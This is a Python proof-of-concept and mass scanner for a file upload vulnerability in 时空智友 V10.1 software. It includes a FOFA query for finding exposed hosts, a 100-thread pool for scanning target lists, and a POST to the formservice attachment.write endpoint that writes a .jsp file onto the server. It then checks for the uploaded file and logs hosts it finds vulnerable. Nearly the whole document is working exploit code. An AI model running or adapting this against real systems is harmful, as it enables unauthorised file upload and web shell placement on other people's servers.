#-*- coding: utf-8 -*-
import argparse,sys,requests,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()


def banner():
    test = """ 
 _____ _     _ _   __                   _______     ___   __          
/  ___| |   (_) | / /                  |___  / |   (_) \ / /          
\ `--.| |__  _| |/ /  ___  _ __   __ _    / /| |__  _ \ V /___  _   _ 
 `--. \ '_ \| |    \ / _ \| '_ \ / _` |  / / | '_ \| | \ // _ \| | | |
/\__/ / | | | | |\  \ (_) | | | | (_| |./ /__| | | | | | | (_) | |_| |
\____/|_| |_|_\_| \_/\___/|_| |_|\__, |\_____/_| |_|_| \_/\___/ \__,_|
                                  __/ |                               
                                 |___/                                
                                                        tag : SHIKONGZHIYOU 系统文件上传漏洞 poc
                                                                             @author : Gui1de
    """
    print(test)



headers = {

    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36",
}

def poc(target):
    if "http://" in target:
        print('请去掉"http://"后重新输入')
    else:
        url = "http://"+target+"/formservice?service=attachment.write&isattach=false&filename=a.jsp"
        data="123456"
        # res = requests.post(url,headers=headers,data=data,verify=False,timeout=5).text
        # url1 = re.findall("""<root>(.*)</root>""",res,re.S)
        # url2 = "http://"+target+"/form/temp/"+url1
        try:
            res = requests.post(url,headers=headers,data=data,verify=False,timeout=5).text
            url1 = re.findall("""<root>(.*)</root>""", res, re.S)
            url2 = "http://"+target+"/form/temp/"+url1[0]
            res1 = requests.post(url2,headers=headers,data=data,verify=False,timeout=5).text
            if "123456" in res1:
                print(f"[+] {target} 存在漏洞   "+"   点击"+url2+"进行验证")
                # print("点击"+url2+"进行验证")
                with open("result.txt", "a+", encoding="utf-8") as f:
                    f.write(target + "\n")
            else:
                print(f"[-] {target} 不存在漏洞")
        except:
            print(f"[*] {target} 请求失败")

def main():
    banner()
    parser = argparse.ArgumentParser(description='时空智友文件上传漏洞fofa语法:app="时空智友V10.1"')
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()